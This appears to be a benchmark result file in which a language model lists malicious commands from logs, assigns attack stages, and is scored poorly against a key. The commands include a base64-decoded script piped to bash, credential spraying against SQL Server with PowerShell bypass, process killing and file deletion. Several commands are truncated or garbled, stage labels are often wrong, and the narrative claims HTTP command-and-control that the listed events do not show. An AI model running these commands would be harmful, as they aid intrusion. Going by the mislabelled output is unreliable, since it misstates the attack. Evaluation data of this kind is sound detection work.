@@ -1,0 +1,103 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c echo start:454b7093-cc6e-484e-9c42-e222c6906204",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c echo end:454b7093-cc6e-484e-9c42-e222c6906204",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c echo start:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c kill -9 $(lsof -i:8080 -t)",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "bash -c\u043a\u0440\u0430\u0457\u043d echo start:152d302e-4a34-48a4-b32b-16c0b3e73f15\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c RM /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c echo start:1185e211-d897-42e4-bb2d-7260f0eba801",
+        "stage": "Collection"
+      },
+      {
+        "command": "sqltool_amd64_u --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c echo end:e147423c-b478-4291-8866-115c380e19a0",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c echo start:3d4c5b71-9d0b-427b-9ddf-5bb208e30119",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sqltool_amd64_u --server 192.168.0.244 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c echo end:3d4c5b71-9d0b-427b-9ddf-5bb208e30119",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attackers initiated an initial access through a command that ran base64-decoded malware as a new bash session. They then executed several collection operations using SQL queries to gather information about the system and network environment, while also attempting to establish a command and control channel via HTTP requests to an IP address. The attackers tried to evade detection by killing running processes and deleting files. Additionally, they escalated their privileges to achieve further goals.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 12535,
+      "completion_tokens": 685,
+      "total_tokens": 13220,
+      "wall_clock_s": 9.478,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.07692307692307693,
+      "recall": 0.14285714285714285,
+      "f1": 0.1,
+      "tp": 1,
+      "fp": 12,
+      "fn": 6
+    },
+    "stage": {
+      "precision": 0.07692307692307693,
+      "recall": 0.14285714285714285,
+      "f1": 0.1,
+      "tp": 1,
+      "fp": 12,
+      "fn": 6,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 12535,
+      "completion_tokens": 685,
+      "total_tokens": 13220,
+      "wall_clock_s": 9.478,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
